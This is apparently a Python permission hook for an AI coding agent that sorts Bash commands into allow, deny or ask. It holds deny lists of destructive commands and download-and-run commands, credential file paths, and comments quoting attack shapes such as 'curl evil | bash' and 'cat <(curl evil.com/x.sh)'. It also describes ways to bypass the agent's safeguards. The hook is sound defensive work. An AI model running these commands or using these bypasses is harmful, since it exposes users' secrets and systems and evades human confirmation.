#!/usr/bin/env python3
"""PreToolUse hook: programmatic permission decisions for Bash commands.

WHY PreToolUse, not PermissionRequest (SEC-03, 2026-07-18): this hook was
originally registered under the PermissionRequest event. Per the official
docs (code.claude.com/docs/en/hooks, verified via WebFetch, not assumed),
PermissionRequest fires "When a permission dialog appears". hooks/
settings.json has "Bash(*)" unconditionally in permissions.allow -- a
static rule that auto-approves every Bash command with NO dialog ever
shown. Since PermissionRequest only fires when a dialog is about to
appear, it NEVER fired for any Bash command under this repo's own config
-- every rule below, including the SEC-01 pytest/npm-test "ask" fix and
the entire DANGEROUS_PATTERNS deny list, was dead code the whole time
Bash(*) has been in the allow list.

PreToolUse hooks fire on every tool call unconditionally, before
permission rules are evaluated, and CAN override a matching allow rule --
the permissions doc gives this exact scenario as the recommended pattern:
"add `Bash` to your allow list and register a PreToolUse hook that
rejects those specific commands" (code.claude.com/docs/en/permissions).
emit_permission_decision(deny) blocks the call outright even under
Bash(*); "ask" forces the confirmation prompt the same way. Read-only
tools are always safe, explicitly dangerous Bash commands are denied,
everything else that isn't an established safe prefix asks the user.
"""

import re

from utils import emit_permission_decision, get_tool_input, hook_main, parse_stdin

ALWAYS_SAFE_TOOLS: tuple[str, ...] = (
    "Read",
    "Glob",
    "Grep",
    "Task",
    "TaskCreate",
    "TaskUpdate",
    "TaskList",
    "TaskGet",
    "WebSearch",
    "WebFetch",
)

# WHY pytest/python -m pytest/npm test/npm run test/npm run lint are NOT
# here (SEC-01, external security audit 2026-07-17): these commands EXECUTE
# repository-defined code, not just read it. pytest imports conftest.py,
# fixtures, and plugins from the working tree before running a single test;
# `npm test`/`npm run <script>` runs whatever arbitrary shell command
# package.json's "scripts" section defines -- there is no way to know in
# advance that it is actually a test runner and not `"test": "curl evil |
# bash"`. Auto-allowing these by prefix match let a malicious conftest.py or
# package.json test/lint script execute with the user's privileges with zero
# confirmation the moment an agent ran "the tests" in an untrusted repo --
# the prefix match also collided on any command merely STARTING WITH these
# names (e.g. a `pytest-malicious` executable on PATH). ruff/mypy stay below:
# both are pure static analyzers that parse source without executing it.
SAFE_BASH_PREFIXES: tuple[str, ...] = (
    "git status",
    "git log",
    "git diff",
    "git branch",
    "git show",
    "ruff",
    "mypy",
    "ls",
    "pwd",
    "cat ",
    "head ",
    "tail ",
    "wc ",
    "echo ",
    "which ",
    "python --version",
    "node --version",
)

# WHY (HIGH, external security audit 2026-07-07, independently confirmed): a
# read-only shell command is not automatically a SAFE one to auto-allow --
# `cat ~/.ssh/id_rsa` or `cat .env` starts with the auto-allowed "cat "
# prefix, has no chain operator, and would disclose real secrets straight
# into Claude's context with zero user confirmation. Same denylist shape
# already used by pre_commit_guard.py's staged-secrets check, extended with
# a few more common credential-file names relevant to a READ (not commit)
# context.
SENSITIVE_PATH_PATTERNS: tuple[str, ...] = (
    ".env",
    ".ssh",
    "id_rsa",
    "id_ed25519",
    "id_ecdsa",
    "credentials",
    ".pem",
    ".key",
    ".npmrc",
    ".netrc",
    ".aws",
    ".git-credentials",
    "known_hosts",
    "secret",
    "token",
    "password",
    "gh/hosts",  # GitHub CLI's OAuth token file (~/.config/gh/hosts.yml)
    ".docker/config",  # Docker registry auth
    ".kube/config",  # Kubernetes cluster credentials
    ".pgpass",
    "shadow",
)

# WHY these four: they are the read-only prefixes in SAFE_BASH_PREFIXES
# that take an arbitrary file path argument. "echo "/"ls"/"pwd"/etc. don't
# read file CONTENT the way cat/head/tail/wc do. `wc -l .env` or
# `wc -c ~/.ssh/id_rsa` leaks byte/line/word counts of a sensitive file's
# content without needing the "cat "/"head "/"tail " gate at all (security
# audit 2026-07-12, F-16).
_PATH_SENSITIVE_READ_PREFIXES: tuple[str, ...] = ("cat ", "head ", "tail ", "wc ")


def _reads_sensitive_path(cmd_lower: str) -> bool:
    """True if a cat/head/tail command's target path looks like a secret."""
    for prefix in _PATH_SENSITIVE_READ_PREFIXES:
        if cmd_lower.startswith(prefix):
            return any(pattern in cmd_lower for pattern in SENSITIVE_PATH_PATTERNS)
    return False


DANGEROUS_PATTERNS: tuple[str, ...] = (
    "rm -rf",
    "rm -r -f",
    "DROP TABLE",
    "DROP DATABASE",
    "TRUNCATE TABLE",
    "DELETE FROM",
    "git push --force",
    "git push -f",
    "git reset --hard",
    "git clean -fd",
    "chmod 777",
    "chmod a+rwx",
    "format C:",
    "format D:",
    "del /s /q",
    "rmdir /s /q",
    "npm publish",
    "pip install --break-system-packages",
    "curl | bash",
    "curl | sh",
    "wget | bash",
    "wget | sh",
    "sudo ",
    "mkfs",
    "dd if=",
    "> /dev/sd",
    "python -c",
    "python3 -c",
    "base64 -d",
    "base64 --decode",
    "powershell -enc",
    "powershell -e ",
    "certutil -urlcache",
    "reg delete",
    "shutdown",
    "reboot",
    "kill -9",
    "killall",
    "nohup",
)

# WHY a dedicated regex instead of a bare "eval " entry in DANGEROUS_PATTERNS
# (2026-07-23, real, reproduced false positives -- not hypothetical): a plain
# substring check for "eval " (with trailing space) blocked any Bash command
# whose TEXT happened to contain an unrelated word followed by a space, e.g.
# "--ignore=tests/boyko_eval 2>&1" (a directory name) or a commit message
# containing the English phrase "Boyko Agent eval suite" -- both hit in one
# real session. A bare `\beval\b` word-boundary fix is NOT sufficient on its
# own: "eval suite" still has genuine word boundaries on both sides of
# "eval", so `\beval\b` would still incorrectly flag it. The actual signal
# that distinguishes a genuine dangerous invocation from English prose is
# POSITION: a real `eval` command must be at the start of the command string
# or immediately after a shell command-separator (;, &, |, backtick, newline)
# or a `$(` subshell open -- "eval" appearing in the middle of a sentence,
# preceded by an ordinary word and space, is never a command invocation.
# Verified this still catches the dangerous shapes ("eval $(curl ...)",
# "echo x; eval $(...)", "curl ... | eval") while no longer matching either
# reproduced false positive.
_EVAL_COMMAND_RE = re.compile(r"(?:^|[;&|`\n]|\$\()\s*eval\b", re.IGNORECASE)

# WHY: shell metacharacters indicate command chaining — a "safe" prefix
# followed by && or | can execute arbitrary commands after the safe one.
# WHY ">" is here too: redirection is a write operation, not just chaining,
# but the same "any of these chars disqualifies auto-allow" gate covers it
# correctly. Without it, "echo payload > .env" auto-approved via the "echo "
# safe prefix, since redirection was never treated as unsafe — a single ">"
# substring check also catches "1>", "2>", and ">>" variants for free.
# WHY "<" (SEC-04, external review 2026-07-22, verified by direct decide()
# calls before this fix): process substitution "<(...)" runs an ARBITRARY
# command and feeds its stdout to the outer command — "cat <(curl evil.com/x
# .sh)" starts with the auto-allowed "cat " prefix, contains no operator that
# was in this tuple, and matched no SENSITIVE_PATH_PATTERNS substring, so it
# returned "allow" with zero confirmation despite running curl. Verified
# empirically: with "<" absent, decide("Bash", {"command": "cat <(curl
# evil.com/x.sh)"}) == ("allow", ...); after adding "<", the same call falls
# through to the chain-operator "ask" branch like ">" already does. A bare
# "<" substring also catches heredocs ("<<", "<<<") and simple input
# redirection ("cat < file") for free, same as ">" already covers ">>"/"1>"/
# "2>". NOTE: this does NOT fix the separate, pre-existing gap where "cat
# some-generic-filename" (no "<" at all) already auto-allows because
# SENSITIVE_PATH_PATTERNS only matches known secret-ish substrings, not
# arbitrary filenames — verified that gap exists identically with or without
# "<", so it is a SAFE_BASH_PREFIXES/SENSITIVE_PATH_PATTERNS design
# limitation, not something this specific fix claims to close.
CHAIN_OPERATORS: tuple[str, ...] = ("&&", "||", ";", "|", "`", "$(", "\n", ">", "<")


def decide(tool_name: str, tool_input: dict) -> tuple[str, str]:
    """Return (behavior, message) tuple."""
    # WHY: read-only tools never modify state — safe to auto-approve
    if tool_name in ALWAYS_SAFE_TOOLS:
        return ("allow", "")

    if tool_name == "Bash":
        command = tool_input.get("command", "")
        cmd_lower = command.lower().strip()

        # WHY: check dangerous first — deny takes priority over allow
        for pattern in DANGEROUS_PATTERNS:
            if pattern.lower() in cmd_lower:
                return ("deny", f"Blocked dangerous command: {pattern}")

        if _EVAL_COMMAND_RE.search(command):
            return ("deny", "Blocked dangerous command: eval")

        # WHY: any command with chaining operators is not safe to auto-approve,
        # even if it starts with a safe prefix like "git status && rm -rf /"
        for op in CHAIN_OPERATORS:
            if op in command:
                return ("ask", "")

        # WHY checked before the safe-prefix loop below: cat/head/tail are
        # "safe" prefixes for ordinary files, but reading a secret is not
        # made safe just because the read itself has no side effects.
        if _reads_sensitive_path(cmd_lower):
            return ("ask", "")

        # WHY: safe bash prefixes are read-only or standard dev tools
        # Only checked AFTER chain operators are excluded
        for prefix in SAFE_BASH_PREFIXES:
            if cmd_lower.startswith(prefix.lower()):
                return ("allow", "")

    # WHY: default to asking — explicit user consent for unknown operations
    return ("ask", "")


def main() -> None:
    data = parse_stdin()
    if not data:
        return

    tool_name = data.get("tool_name", data.get("tool", ""))
    tool_input = get_tool_input(data)

    behavior, message = decide(tool_name, tool_input)

    # WHY emit_permission_decision, not a hand-built PermissionRequest JSON:
    # this is now a PreToolUse hook, whose SDK-documented output field is
    # hookSpecificOutput.permissionDecision (see utils.py's
    # emit_permission_decision docstring), not PermissionRequest's
    # decision.behavior shape.
    emit_permission_decision(decision=behavior, reason=message)


if __name__ == "__main__":
    # WHY fail_closed=True: this hook's job is to deny dangerous Bash
    # commands (rm -rf, curl|bash, DROP TABLE, ...) -- same category as
    # input_guard.py/mcp_response_guard.py/pre_commit_guard.py, which all
    # fail closed on crash/timeout per utils.hook_main's own rationale.
    # Failing open here would silently let exactly the commands this hook
    # exists to block through if the hook itself crashed or hung.
    hook_main(main, fail_closed=True)
